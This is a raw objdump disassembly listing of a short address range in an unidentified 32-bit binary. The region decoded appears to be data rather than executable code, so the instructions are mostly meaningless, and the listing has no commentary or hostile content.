  40635f:	00 91 00 96 08 89    	add    %dl,-0x76f76a00(%ecx)
  406365:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406368:	b8 2c 00 00 00       	mov    $0x2c,%eax
  40636d:	00 96 00 56 19 0a    	add    %dl,0xa195600(%esi)
  406373:	00 10                	add    %dl,(%eax)
  406375:	00 40 2d             	add    %al,0x2d(%eax)
  406378:	00 00                	add    %al,(%eax)
  40637a:	00 00                	add    %al,(%eax)
  40637c:	96                   	xchg   %eax,%esi
  40637d:	00 ac 02 94 00 10 00 	add    %ch,0x100094(%edx,%eax,1)
  406384:	24 2f                	and    $0x2f,%al
  406386:	00 00                	add    %al,(%eax)
  406388:	00 00                	add    %al,(%eax)
  40638a:	96                   	xchg   %eax,%esi
  40638b:	00 cd                	add    %cl,%ch
  40638d:	04 58                	add    $0x58,%al
  40638f:	00 11                	add    %dl,(%ecx)
  406391:	00 5c 30 00          	add    %bl,0x0(%eax,%esi,1)
  406395:	00 00                	add    %al,(%eax)
  406397:	00 96 00 8f 19 9a    	add    %dl,-0x65e67100(%esi)
  40639d:	00 12                	add    %dl,(%edx)
  40639f:	00 c8                	add    %cl,%al
  4063a1:	30 00                	xor    %al,(%eax)
  4063a3:	00 00                	add    %al,(%eax)
  4063a5:	00 91 00 06 0d 9a    	add    %dl,-0x65f2fa00(%ecx)
  4063ab:	00 13                	add    %dl,(%ebx)
  4063ad:	00 35 21 00 00 00    	add    %dh,0x21
  4063b3:	00 91 18 0d 15 0a    	add    %dl,0xa150d18(%ecx)
  4063b9:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063bc:	10 31                	adc    %dh,(%ecx)
  4063be:	00 00                	add    %al,(%eax)
  4063c0:	00 00                	add    %al,(%eax)
  4063c2:	96                   	xchg   %eax,%esi
  4063c3:	00 13                	add    %dl,(%ebx)
  4063c5:	0f 0a                	(bad)
  4063c7:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063ca:	78 20                	js     0x4063ec
  4063cc:	00 00                	add    %al,(%eax)
  4063ce:	00 00                	add    %al,(%eax)
  4063d0:	86 18                	xchg   %bl,(%eax)
  4063d2:	07                   	pop    %es
  4063d3:	15 0e 00 14 00       	adc    $0x14000e,%eax
  4063d8:	41                   	inc    %ecx
  4063d9:	21 00                	and    %eax,(%eax)
  4063db:	00 00                	add    %al,(%eax)
  4063dd:	00 96 00 45 17 0a    	add    %dl,0xa174500(%esi)
  4063e3:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063e6:	f8                   	clc
  4063e7:	33 00                	xor    (%eax),%eax
  4063e9:	00 00                	add    %al,(%eax)
  4063eb:	00 91 00 62 0e 1d    	add    %dl,0x1d0e6200(%ecx)
  4063f1:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063f4:	50                   	push   %eax
  4063f5:	34 00                	xor    $0x0,%al
  4063f7:	00 00                	add    %al,(%eax)
  4063f9:	00 91 00 6f 02 1d    	add    %dl,0x1d026f00(%ecx)
  4063ff:	00 14 00             	add    %dl,(%eax,%eax,1)
  406402:	a0 34 00 00 00       	mov    0x34,%al
  406407:	00 91 00 51 14 1d    	add    %dl,0x1d145100(%ecx)
  40640d:	00 14 00             	add    %dl,(%eax,%eax,1)
  406410:	dc 35 00 00 00 00    	fdivl  0x0
  406416:	91                   	xchg   %eax,%ecx
  406417:	00 ed                	add    %ch,%ch
  406419:	13 1d 00 14 00 20    	adc    0x20001400,%ebx
  40641f:	36 00 00             	add    %al,%ss:(%eax)
  406422:	00 00                	add    %al,(%eax)
  406424:	91                   	xchg   %eax,%ecx
  406425:	00 8e 05 1d 00 14    	add    %cl,0x14001d05(%esi)
  40642b:	00 78 20             	add    %bh,0x20(%eax)
  40642e:	00 00                	add    %al,(%eax)
  406430:	00 00                	add    %al,(%eax)
  406432:	86 18                	xchg   %bl,(%eax)
  406434:	07                   	pop    %es
  406435:	15 0e 00 14 00       	adc    $0x14000e,%eax
  40643a:	6c                   	insb   (%dx),%es:(%edi)
  40643b:	36 00 00             	add    %al,%ss:(%eax)
  40643e:	00 00                	add    %al,(%eax)
  406440:	96                   	xchg   %eax,%esi
  406441:	00 f8                	add    %bh,%al
  406443:	01 c3                	add    %eax,%ebx
  406445:	00 14 00             	add    %dl,(%eax,%eax,1)
  406448:	f0 36 00 00          	lock add %al,%ss:(%eax)
  40644c:	00 00                	add    %al,(%eax)
  40644e:	96                   	xchg   %eax,%esi
  40644f:	00 35 0d c7 00 14    	add    %dh,0x1400c70d
  406455:	00 5c 37 00          	add    %bl,0x0(%edi,%esi,1)
  406459:	00 00                	add    %al,(%eax)
  40645b:	00 96 00 1a 12 53    	add    %dl,0x53121a00(%esi)
  406461:	00 15 00 7b 21 00    	add    %dl,0x217b00
  406467:	00 00                	add    %al,(%eax)
  406469:	00 96 00 dd 10 1d    	add    %dl,0x1d10dd00(%esi)
  40646f:	00 15 00 18 39 00    	add    %dl,0x391800
  406475:	00 00                	add    %al,(%eax)
  406477:	00 96 00 ed 19 0a    	add    %dl,0xa19ed00(%esi)
  40647d:	00 15 00 90 39 00    	add    %dl,0x399000
  406483:	00 00                	add    %al,(%eax)
  406485:	00 96 00 b9 18 c3    	add    %dl,-0x3ce74700(%esi)
  40648b:	00 15 00 7c 3a 00    	add    %dl,0x3a7c00
  406491:	00 00                	add    %al,(%eax)
  406493:	00 96 00 89 13 d5    	add    %dl,-0x2aec7700(%esi)
  406499:	00 15 00 c4 3a 00    	add    %dl,0x3ac400
  40649f:	00 00                	add    %al,(%eax)
  4064a1:	00 96 00 7f 12 0a    	add    %dl,0xa127f00(%esi)
  4064a7:	00 16                	add    %dl,(%esi)
  4064a9:	00 f8                	add    %bh,%al
  4064ab:	3a 00                	cmp    (%eax),%al
  4064ad:	00 00                	add    %al,(%eax)
  4064af:	00 96 00 96 06 c3    	add    %dl,-0x3cf96a00(%esi)
  4064b5:	00 16                	add    %dl,(%esi)
  4064b7:	00 54 3b 00          	add    %dl,0x0(%ebx,%edi,1)
  4064bb:	00 00                	add    %al,(%eax)
  4064bd:	00 96 00 3e 1c 1d    	add    %dl,0x1d1c3e00(%esi)
  4064c3:	00 16                	add    %dl,(%esi)
  4064c5:	00 91 21 00 00 00    	add    %dl,0x21(%ecx)
  4064cb:	00 96 00 33 1c 0a    	add    %dl,0xa1c3300(%esi)
  4064d1:	00 16                	add    %dl,(%esi)
  4064d3:	00 00                	add    %al,(%eax)
  4064d5:	00 00                	add    %al,(%eax)
  4064d7:	00 80 00 96 20 06    	add    %al,0x6209600(%eax)
  4064dd:	1c e0                	sbb    $0xe0,%al
  4064df:	00 16                	add    %dl,(%esi)
  4064e1:	00 00                	add    %al,(%eax)
  4064e3:	00 00                	add    %al,(%eax)
  4064e5:	00 80 00 96 20 f1    	add    %al,-0xedf6a00(%eax)
  4064eb:	1b e4                	sbb    %esp,%esp
  4064ed:	00 16                	add    %dl,(%esi)
  4064ef:	00 00                	add    %al,(%eax)
  4064f1:	00 00                	add    %al,(%eax)
  4064f3:	00 80 00 96 20 ef    	add    %al,-0x10df6a00(%eax)
  4064f9:	05 ec 00 19 00       	add    $0x1900ec,%eax
  4064fe:	00 00                	add    %al,(%eax)
  406500:	00 00                	add    %al,(%eax)
  406502:	80 00 96             	addb   $0x96,(%eax)
  406505:	20 07                	and    %al,(%edi)
  406507:	1b f1                	sbb    %ecx,%esi
  406509:	00 1a                	add    %bl,(%edx)
  40650b:	00 00                	add    %al,(%eax)
  40650d:	00 00                	add    %al,(%eax)
  40650f:	00 80 00 96 20 c3    	add    %al,-0x3cdf6a00(%eax)
  406515:	08 f8                	or     %bh,%al
  406517:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40651a:	00 00                	add    %al,(%eax)
  40651c:	00 00                	add    %al,(%eax)
  40651e:	80 00 96             	addb   $0x96,(%eax)
  406521:	20 84 0e ff 00 1d 00 	and    %al,0x1d00ff(%esi,%ecx,1)
  406528:	ad                   	lods   %ds:(%esi),%eax
  406529:	21 00                	and    %eax,(%eax)
  40652b:	00 00                	add    %al,(%eax)
  40652d:	00 96 00 cd 0b 1c    	add    %dl,0x1c0bcd00(%esi)
  406533:	01 20                	add    %esp,(%eax)
  406535:	00 74 3b 00          	add    %dh,0x0(%ebx,%edi,1)
  406539:	00 00                	add    %al,(%eax)
  40653b:	00 96 00 6f 19 0a    	add    %dl,0xa196f00(%esi)
  406541:	00 22                	add    %ah,(%edx)
  406543:	00 bc 3b 00 00 00 00 	add    %bh,0x0(%ebx,%edi,1)
  40654a:	96                   	xchg   %eax,%esi
  40654b:	00 f5                	add    %dh,%ch
  40654d:	19 0a                	sbb    %ecx,(%edx)
  40654f:	00 22                	add    %ah,(%edx)
  406551:	00 f4                	add    %dh,%ah
  406553:	3b 00                	cmp    (%eax),%eax
  406555:	00 00                	add    %al,(%eax)
  406557:	00 96 00 c1 0a 23    	add    %dl,0x230ac100(%esi)
  40655d:	01 22                	add    %esp,(%edx)
  40655f:	00 60 3c             	add    %ah,0x3c(%eax)
  406562:	00 00                	add    %al,(%eax)
  406564:	00 00                	add    %al,(%eax)
  406566:	96                   	xchg   %eax,%esi
  406567:	00 b8 0a 2a 01 24    	add    %bh,0x24012a0a(%eax)
  40656d:	00 cc                	add    %cl,%ah
  40656f:	3c 00                	cmp    $0x0,%al
  406571:	00 00                	add    %al,(%eax)
  406573:	00 96 00 a1 0a 84    	add    %dl,-0x7bf55f00(%esi)
  406579:	00 25 00 34 3d 00    	add    %ah,0x3d3400
  40657f:	00 00                	add    %al,(%eax)
  406581:	00 96 00 b4 1c 1d    	add    %dl,0x1d1cb400(%esi)
  406587:	00 26                	add    %ah,(%esi)
  406589:	00 cd                	add    %cl,%ch
  40658b:	21 00                	and    %eax,(%eax)
  40658d:	00 00                	add    %al,(%eax)
  40658f:	00 91 18 0d 15 0a    	add    %dl,0xa150d18(%ecx)
  406595:	00 26                	add    %ah,(%esi)
  406597:	00 a0 3d 00 00 00    	add    %ah,0x3d(%eax)
  40659d:	00 96 00 15 03 9a    	add    %dl,-0x65fceb00(%esi)
  4065a3:	00 26                	add    %ah,(%esi)
  4065a5:	00 d4                	add    %dl,%ah
  4065a7:	3f                   	aas
  4065a8:	00 00                	add    %al,(%eax)
  4065aa:	00 00                	add    %al,(%eax)
  4065ac:	91                   	xchg   %eax,%ecx
  4065ad:	00 9e 05 38 01 27    	add    %bl,0x27013805(%esi)
  4065b3:	00 e3                	add    %ah,%bl
  4065b5:	21 00                	and    %eax,(%eax)
  4065b7:	00 00                	add    %al,(%eax)
  4065b9:	00 91 00 6b 03 0a    	add    %dl,0xa036b00(%ecx)
  4065bf:	00 28                	add    %ch,(%eax)
  4065c1:	00 13                	add    %dl,(%ebx)
  4065c3:	22 00                	and    (%eax),%al
  4065c5:	00 00                	add    %al,(%eax)
  4065c7:	00 96 00 a3 14 3e    	add    %dl,0x3e14a300(%esi)
  4065cd:	01 28                	add    %ebp,(%eax)
  4065cf:	00 4a 22             	add    %cl,0x22(%edx)
  4065d2:	00 00                	add    %al,(%eax)
  4065d4:	00 00                	add    %al,(%eax)
  4065d6:	91                   	xchg   %eax,%ecx
  4065d7:	18 0d 15 0a 00 29    	sbb    %cl,0x29000a15
  4065dd:	00 f4                	add    %dh,%ah
  4065df:	40                   	inc    %eax
  4065e0:	00 00                	add    %al,(%eax)
  4065e2:	00 00                	add    %al,(%eax)
  4065e4:	86 18                	xchg   %bl,(%eax)
  4065e6:	07                   	pop    %es
  4065e7:	15 6b 01 29 00       	adc    $0x29016b,%eax
  4065ec:	56                   	push   %esi
  4065ed:	22 00                	and    (%eax),%al
  4065ef:	00 00                	add    %al,(%eax)
  4065f1:	00 86 00 7e 1b 70    	add    %al,0x701b7e00(%esi)
  4065f7:	01 2a                	add    %ebp,(%edx)
  4065f9:	00 6c 41 00          	add    %ch,0x0(%ecx,%eax,2)
  4065fd:	00 00                	add    %al,(%eax)
  4065ff:	00 86 00 7e 1b 75    	add    %al,0x751b7e00(%esi)
  406605:	01 2b                	add    %ebp,(%ebx)
  406607:	00 6e 22             	add    %ch,0x22(%esi)
  40660a:	00 00                	add    %al,(%eax)
  40660c:	00 00                	add    %al,(%eax)
  40660e:	86 00                	xchg   %al,(%eax)
  406610:	76 1b                	jbe    0x40662d
  406612:	70 01                	jo     0x406615
  406614:	2c 00                	sub    $0x0,%al
  406616:	c4 42 00             	les    0x0(%edx),%eax
  406619:	00 00                	add    %al,(%eax)
  40661b:	00 86 00 76 1b 75    	add    %al,0x751b7600(%esi)
  406621:	01 2d 00 84 44 00    	add    %ebp,0x448400
  406627:	00 48 00             	add    %cl,0x0(%eax)
  40662a:	81 00 e9 0e 7c 01    	addl   $0x17c0ee9,(%eax)
  406630:	2e 00 86 22 00 00 00 	add    %al,%cs:0x22(%esi)
  406637:	00 91 18 0d 15 0a    	add    %dl,0xa150d18(%ecx)
  40663d:	00 30                	add    %dh,(%eax)
  40663f:	00 b4 44 00 00 00 00 	add    %dh,0x0(%esp,%eax,2)
  406646:	96                   	xchg   %eax,%esi
  406647:	00 1f                	add    %bl,(%edi)
  406649:	0d c7 00 30 00       	or     $0x3000c7,%eax
  40664e:	40                   	inc    %eax
  40664f:	45                   	inc    %ebp
  406650:	00 00                	add    %al,(%eax)
  406652:	00 00                	add    %al,(%eax)
  406654:	96                   	xchg   %eax,%esi
  406655:	00 1f                	add    %bl,(%edi)
  406657:	0d 84 01 31 00       	or     $0x310184,%eax
  40665c:	9f                   	lahf
  40665d:	22 00                	and    (%eax),%al
  40665f:	00 00                	add    %al,(%eax)
  406661:	00 96 00 44 16 2a    	add    %dl,0x2a164400(%esi)
  406667:	01 32                	add    %esi,(%edx)
  406669:	00 ac 22 00 00 00 00 	add    %ch,0x0(%edx,%eiz,1)
  406670:	96                   	xchg   %eax,%esi
  406671:	00 b5 0c 93 01 33    	add    %dh,0x3301930c(%ebp)
  406677:	00 80 45 00 00 00    	add    %al,0x45(%eax)
  40667d:	00 96 00 8f 0c 93    	add    %dl,-0x6cf37100(%esi)
  406683:	01 34 00             	add    %esi,(%eax,%eax,1)
  406686:	c8 45 00 00          	enter  $0x45,$0x0
  40668a:	00 00                	add    %al,(%eax)
  40668c:	96                   	xchg   %eax,%esi
  40668d:	00 bf 0c 93 01 35    	add    %bh,0x3501930c(%edi)
  406693:	00 10                	add    %dl,(%eax)
  406695:	46                   	inc    %esi
  406696:	00 00                	add    %al,(%eax)
  406698:	00 00                	add    %al,(%eax)
  40669a:	96                   	xchg   %eax,%esi
  40669b:	00 8b 16 84 01 36    	add    %cl,0x36018416(%ebx)
  4066a1:	00 b9 22 00 00 00    	add    %bh,0x22(%ecx)
  4066a7:	00 96 00 d6 00 99    	add    %dl,-0x66ff2a00(%esi)
  4066ad:	01 37                	add    %esi,(%edi)
  4066af:	00 c6                	add    %al,%dh
  4066b1:	22 00                	and    (%eax),%al
  4066b3:	00 00                	add    %al,(%eax)
  4066b5:	00 96 00 76 00 9f    	add    %dl,-0x60ff8a00(%esi)
  4066bb:	01 38                	add    %edi,(%eax)
  4066bd:	00 ea                	add    %ch,%dl
  4066bf:	22 00                	and    (%eax),%al
  4066c1:	00 00                	add    %al,(%eax)
  4066c3:	00 96 00 f1 00 a5    	add    %dl,-0x5aff0f00(%esi)
  4066c9:	01 39                	add    %edi,(%ecx)
  4066cb:	00 fe                	add    %bh,%dh
  4066cd:	22 00                	and    (%eax),%al
  4066cf:	00 00                	add    %al,(%eax)
  4066d1:	00 96 00 c6 05 ab    	add    %dl,-0x54fa3a00(%esi)
  4066d7:	01 3a                	add    %edi,(%edx)
  4066d9:	00 78 20             	add    %bh,0x20(%eax)
  4066dc:	00 00                	add    %al,(%eax)
  4066de:	00 00                	add    %al,(%eax)
  4066e0:	86 18                	xchg   %bl,(%eax)
  4066e2:	07                   	pop    %es
  4066e3:	15 0e 00 3b 00       	adc    $0x3b000e,%eax
  4066e8:	0b 23                	or     (%ebx),%esp
  4066ea:	00 00                	add    %al,(%eax)
  4066ec:	00 00                	add    %al,(%eax)
  4066ee:	91                   	xchg   %eax,%ecx
  4066ef:	18 0d 15 0a 00 3b    	sbb    %cl,0x3b000a15
  4066f5:	00 17                	add    %dl,(%edi)
  4066f7:	23 00                	and    (%eax),%eax
  4066f9:	00 00                	add    %al,(%eax)
  4066fb:	00 86 18 07 15 b1    	add    %al,-0x4eeaf8e8(%esi)
  406701:	01 3b                	add    %edi,(%ebx)
  406703:	00 2d 23 00 00 00    	add    %ch,0x23
  406709:	00 e1                	add    %ah,%cl
  40670b:	09 d1                	or     %edx,%ecx
  40670d:	1a bb 01 3c 00 40    	sbb    0x40003c01(%ebx),%bh
  406713:	23 00                	and    (%eax),%eax
  406715:	00 00                	add    %al,(%eax)
  406717:	00 e1                	add    %ah,%cl
  406719:	01 bd 1b bf 01 3c    	add    %edi,0x3c01bf1b(%ebp)
  40671f:	00 63 23             	add    %ah,0x23(%ebx)
  406722:	00 00                	add    %al,(%eax)
  406724:	00 00                	add    %al,(%eax)
  406726:	e1 01                	loope  0x406729
  406728:	ac                   	lods   %ds:(%esi),%al
  406729:	19 0e                	sbb    %ecx,(%esi)
  40672b:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40672e:	6c                   	insb   (%dx),%es:(%edi)
  40672f:	23 00                	and    (%eax),%eax
  406731:	00 00                	add    %al,(%eax)
  406733:	00 86 18 07 15 cb    	add    %al,-0x34eaf8e8(%esi)
  406739:	01 3c 00             	add    %edi,(%eax,%eax,1)
  40673c:	82 23 00             	andb   $0x0,(%ebx)
  40673f:	00 00                	add    %al,(%eax)
  406741:	00 86 00 2b 03 d7    	add    %al,-0x28fcd500(%esi)
  406747:	01 3e                	add    %edi,(%esi)
  406749:	00 8f 23 00 00 00    	add    %cl,0x23(%edi)
  40674f:	00 86 00 2b 03 dc    	add    %al,-0x23fcd500(%esi)
  406755:	01 3e                	add    %edi,(%esi)
  406757:	00 a3 23 00 00 00    	add    %ah,0x23(%ebx)
  40675d:	00 86 00 2b 03 e2    	add    %al,-0x1dfcd500(%esi)
  406763:	01 3f                	add    %edi,(%edi)
  406765:	00 b7 23 00 00 00    	add    %dh,0x23(%edi)
  40676b:	00 86 00 2b 03 e8    	add    %al,-0x17fcd500(%esi)
  406771:	01 40 00             	add    %eax,0x0(%eax)
  406774:	cb                   	lret
  406775:	23 00                	and    (%eax),%eax
  406777:	00 00                	add    %al,(%eax)
  406779:	00 86 08 d7 0f ee    	add    %al,-0x11f028f8(%esi)
  40677f:	01 41 00             	add    %eax,0x0(%ecx)
  406782:	d9 23                	fldenv (%ebx)
  406784:	00 00                	add    %al,(%eax)
  406786:	00 00                	add    %al,(%eax)
  406788:	86 08                	xchg   %cl,(%eax)
  40678a:	83 0d f4 01 42 00 e6 	orl    $0xffffffe6,0x4201f4
  406791:	23 00                	and    (%eax),%eax
  406793:	00 00                	add    %al,(%eax)
  406795:	00 81 00 95 07 6b    	add    %al,0x6b079500(%ecx)
  40679b:	01 42 00             	add    %eax,0x0(%edx)
  40679e:	48                   	dec    %eax
  40679f:	46                   	inc    %esi
  4067a0:	00 00                	add    %al,(%eax)
  4067a2:	00 00                	add    %al,(%eax)
  4067a4:	81 00 cc 12 0e 00    	addl   $0xe12cc,(%eax)
  4067aa:	43                   	inc    %ebx
  4067ab:	00 8c 46 00 00 00 00 	add    %cl,0x0(%esi,%eax,2)
  4067b2:	81 00 26 03 d7 01    	addl   $0x1d70326,(%eax)
  4067b8:	43                   	inc    %ebx
  4067b9:	00 b4 46 00 00 00 00 	add    %dh,0x0(%esi,%eax,2)
  4067c0:	81 00 6f 0b 0a 02    	addl   $0x20a0b6f,(%eax)
  4067c6:	43                   	inc    %ebx
  4067c7:	00 30                	add    %dh,(%eax)
  4067c9:	47                   	inc    %edi
  4067ca:	00 00                	add    %al,(%eax)
  4067cc:	00 00                	add    %al,(%eax)
  4067ce:	86 00                	xchg   %al,(%eax)
  4067d0:	16                   	push   %ss
  4067d1:	19 dc                	sbb    %ebx,%esp
  4067d3:	01 44 00 00          	add    %eax,0x0(%eax,%eax,1)
  4067d7:	24 00                	and    $0x0,%al
  4067d9:	00 00                	add    %al,(%eax)
  4067db:	00 81 00 a4 04 d7    	add    %al,-0x28fb5c00(%ecx)
  4067e1:	01 45 00             	add    %eax,0x0(%ebp)
  4067e4:	21 24 00             	and    %esp,(%eax,%eax,1)
  4067e7:	00 00                	add    %al,(%eax)
  4067e9:	00 81 00 b5 04 d7    	add    %al,-0x28fb4b00(%ecx)
  4067ef:	01 45 00             	add    %eax,0x0(%ebp)
  4067f2:	42                   	inc    %edx
  4067f3:	24 00                	and    $0x0,%al
  4067f5:	00 00                	add    %al,(%eax)
  4067f7:	00 86 00 ba 04 d7    	add    %al,-0x28fb4600(%esi)
  4067fd:	01 45 00             	add    %eax,0x0(%ebp)
  406800:	5c                   	pop    %esp
  406801:	47                   	inc    %edi
  406802:	00 00                	add    %al,(%eax)
  406804:	00 00                	add    %al,(%eax)
  406806:	81 00 76 12 0f 02    	addl   $0x20f1276,(%eax)
  40680c:	45                   	inc    %ebp
  40680d:	00 24 48             	add    %ah,(%eax,%ecx,2)
  406810:	00 00                	add    %al,(%eax)
  406812:	00 00                	add    %al,(%eax)
  406814:	81 00 50 1c 0f 02    	addl   $0x20f1c50,(%eax)
  40681a:	46                   	inc    %esi
  40681b:	00 4a 24             	add    %cl,0x24(%edx)
  40681e:	00 00                	add    %al,(%eax)
  406820:	00 00                	add    %al,(%eax)
  406822:	86 00                	xchg   %al,(%eax)
  406824:	e0 13                	loopne 0x406839
  406826:	15 02 47 00 5f       	adc    $0x5f004702,%eax
  40682b:	24 00                	and    $0x0,%al
  40682d:	00 00                	add    %al,(%eax)
  40682f:	00 86 00 c2 00 1a    	add    %al,0x1a00c200(%esi)
  406835:	02 48 00             	add    0x0(%eax),%cl
  406838:	d8 48 00             	fmuls  0x0(%eax)
  40683b:	00 00                	add    %al,(%eax)
  40683d:	00 86 00 b6 00 1f    	add    %al,0x1f00b600(%esi)
  406843:	02 49 00             	add    0x0(%ecx),%cl
  406846:	80 49 00 00          	orb    $0x0,0x0(%ecx)
  40684a:	00 00                	add    %al,(%eax)
  40684c:	86 00                	xchg   %al,(%eax)
  40684e:	d3 13                	rcll   %cl,(%ebx)
  406850:	23 02                	and    (%edx),%eax
  406852:	49                   	dec    %ecx
  406853:	00 28                	add    %ch,(%eax)
  406855:	4a                   	dec    %edx
  406856:	00 00                	add    %al,(%eax)
  406858:	00 00                	add    %al,(%eax)
  40685a:	86 00                	xchg   %al,(%eax)
  40685c:	00 19                	add    %bl,(%ecx)
  40685e:	27                   	daa
  40685f:	02 49 00             	add    0x0(%ecx),%cl
  406862:	74 24                	je     0x406888
  406864:	00 00                	add    %al,(%eax)
  406866:	00 00                	add    %al,(%eax)
  406868:	86 00                	xchg   %al,(%eax)
  40686a:	b0 16                	mov    $0x16,%al
  40686c:	2b 02                	sub    (%edx),%eax
  40686e:	49                   	dec    %ecx
  40686f:	00 bc 4a 00 00 00 00 	add    %bh,0x0(%edx,%ecx,2)
  406876:	86 00                	xchg   %al,(%eax)
  406878:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406879:	16                   	push   %ss
  40687a:	31 02                	xor    %eax,(%edx)
  40687c:	4a                   	dec    %edx
  40687d:	00 85 24 00 00 00    	add    %al,0x24(%ebp)
  406883:	00 86 00 2b 03 36    	add    %al,0x36032b00(%esi)
  406889:	02 4a 00             	add    0x0(%edx),%cl
  40688c:	9a 24 00 00 00 00 86 	lcall  $0x8600,$0x24
  406893:	00 2b                	add    %ch,(%ebx)
  406895:	03 3c 02             	add    (%edx,%eax,1),%edi
  406898:	4c                   	dec    %esp
  406899:	00 6c 4b 00          	add    %ch,0x0(%ebx,%ecx,2)
  40689d:	00 00                	add    %al,(%eax)
  40689f:	00 86 00 95 16 42    	add    %al,0x42169500(%esi)
  4068a5:	02 4e 00             	add    0x0(%esi),%cl
  4068a8:	c4 4b 00             	les    0x0(%ebx),%ecx
  4068ab:	00 00                	add    %al,(%eax)
  4068ad:	00 86 00 6a 06 42    	add    %al,0x42066a00(%esi)
  4068b3:	02 4f 00             	add    0x0(%edi),%cl
  4068b6:	10 4c 00 00          	adc    %cl,0x0(%eax,%eax,1)
  4068ba:	00 00                	add    %al,(%eax)
  4068bc:	86 00                	xchg   %al,(%eax)
  4068be:	36 19 dc             	ss sbb %ebx,%esp
  4068c1:	01 50 00             	add    %edx,0x0(%eax)
  4068c4:	b0 24                	mov    $0x24,%al
  4068c6:	00 00                	add    %al,(%eax)
  4068c8:	00 00                	add    %al,(%eax)
  4068ca:	86 00                	xchg   %al,(%eax)
  4068cc:	51                   	push   %ecx
  4068cd:	0f 0e                	femms
  4068cf:	00 51 00             	add    %dl,0x0(%ecx)
  4068d2:	c6                   	(bad)
  4068d3:	24 00                	and    $0x0,%al
  4068d5:	00 00                	add    %al,(%eax)
  4068d7:	00 86 00 a9 0c 6b    	add    %al,0x6b0ca900(%esi)
  4068dd:	01 51 00             	add    %edx,0x0(%ecx)
  4068e0:	d6                   	salc
  4068e1:	24 00                	and    $0x0,%al
  4068e3:	00 00                	add    %al,(%eax)
  4068e5:	00 86 00 9d 0c 47    	add    %al,0x470c9d00(%esi)
  4068eb:	02 52 00             	add    0x0(%edx),%dl
  4068ee:	f4                   	hlt
  4068ef:	24 00                	and    $0x0,%al
  4068f1:	00 00                	add    %al,(%eax)
  4068f3:	00 86 00 81 10 4b    	add    %al,0x4b108100(%esi)
  4068f9:	02 52 00             	add    0x0(%edx),%dl
  4068fc:	09 25 00 00 00 00    	or     %esp,0x0
  406902:	86 00                	xchg   %al,(%eax)
  406904:	43                   	inc    %ebx
  406905:	06                   	push   %es
  406906:	50                   	push   %eax
  406907:	02 53 00             	add    0x0(%ebx),%dl
  40690a:	1f                   	pop    %ds
  40690b:	25 00 00 00 00       	and    $0x0,%eax
  406910:	86 00                	xchg   %al,(%eax)
  406912:	0b 19                	or     (%ecx),%ebx
  406914:	55                   	push   %ebp
  406915:	02 54 00 cc          	add    -0x34(%eax,%eax,1),%dl
  406919:	4c                   	dec    %esp
  40691a:	00 00                	add    %al,(%eax)
  40691c:	00 00                	add    %al,(%eax)
  40691e:	86 00                	xchg   %al,(%eax)
  406920:	7b 16                	jnp    0x406938
  406922:	2b 02                	sub    (%edx),%eax
  406924:	55                   	push   %ebp
  406925:	00 24 4d 00 00 00 00 	add    %ah,0x0(,%ecx,2)
  40692c:	86 00                	xchg   %al,(%eax)
  40692e:	5b                   	pop    %ebx
  40692f:	06                   	push   %es
  406930:	6b 01 56             	imul   $0x56,(%ecx),%eax
  406933:	00 48 4d             	add    %cl,0x4d(%eax)
  406936:	00 00                	add    %al,(%eax)
  406938:	00 00                	add    %al,(%eax)
  40693a:	86 00                	xchg   %al,(%eax)
  40693c:	99                   	cltd
  40693d:	0f                   	(bad)
  40693e:	0f 02 57 00          	lar    0x0(%edi),%edx
  406942:	5c                   	pop    %esp
  406943:	53                   	push   %ebx
  406944:	00 00                	add    %al,(%eax)
  406946:	00 00                	add    %al,(%eax)
  406948:	86 00                	xchg   %al,(%eax)
  40694a:	37                   	aaa
  40694b:	16                   	push   %ss
  40694c:	31 02                	xor    %eax,(%edx)
  40694e:	58                   	pop    %eax
  40694f:	00 c8                	add    %cl,%al
  406951:	53                   	push   %ebx
  406952:	00 00                	add    %al,(%eax)
  406954:	00 00                	add    %al,(%eax)
  406956:	86 00                	xchg   %al,(%eax)
  406958:	68 0f 0f 02 58       	push   $0x58020f0f
  40695d:	00 34 25 00 00 00 00 	add    %dh,0x0(,%eiz,1)
  406964:	86 08                	xchg   %cl,(%eax)
  406966:	75 0c                	jne    0x406974
  406968:	47                   	inc    %edi
  406969:	02 59 00             	add    0x0(%ecx),%bl
  40696c:	3c 25                	cmp    $0x25,%al
  40696e:	00 00                	add    %al,(%eax)
  406970:	00 00                	add    %al,(%eax)
  406972:	86 08                	xchg   %cl,(%eax)
  406974:	82 0c 6b 01          	orb    $0x1,(%ebx,%ebp,2)
  406978:	59                   	pop    %ecx
  406979:	00 45 25             	add    %al,0x25(%ebp)
  40697c:	00 00                	add    %al,(%eax)
  40697e:	00 00                	add    %al,(%eax)
  406980:	86 08                	xchg   %cl,(%eax)
  406982:	b7 13                	mov    $0x13,%bh
  406984:	23 02                	and    (%edx),%eax
  406986:	5a                   	pop    %edx
  406987:	00 4d 25             	add    %cl,0x25(%ebp)
  40698a:	00 00                	add    %al,(%eax)
  40698c:	00 00                	add    %al,(%eax)
  40698e:	86 08                	xchg   %cl,(%eax)
  406990:	c5 13                	lds    (%ebx),%edx
  406992:	15 02 5a 00 56       	adc    $0x56005a02,%eax
  406997:	25 00 00 00 00       	and    $0x0,%eax
  40699c:	86 08                	xchg   %cl,(%eax)
  40699e:	e8 18 27 02 5b       	call   0x5b4290bb
  4069a3:	00 5e 25             	add    %bl,0x25(%esi)
  4069a6:	00 00                	add    %al,(%eax)
  4069a8:	00 00                	add    %al,(%eax)
  4069aa:	86 08                	xchg   %cl,(%eax)
  4069ac:	f4                   	hlt
  4069ad:	18 55 02             	sbb    %dl,0x2(%ebp)
  4069b0:	5b                   	pop    %ebx
  4069b1:	00 c0                	add    %al,%al
  4069b3:	54                   	push   %esp
  4069b4:	00 00                	add    %al,(%eax)
  4069b6:	00 00                	add    %al,(%eax)
  4069b8:	86 08                	xchg   %cl,(%eax)
  4069ba:	80 1c 5a 02          	sbbb   $0x2,(%edx,%ebx,2)
  4069be:	5c                   	pop    %esp
  4069bf:	00 67 25             	add    %ah,0x25(%edi)
  4069c2:	00 00                	add    %al,(%eax)
  4069c4:	00 00                	add    %al,(%eax)
  4069c6:	86 08                	xchg   %cl,(%eax)
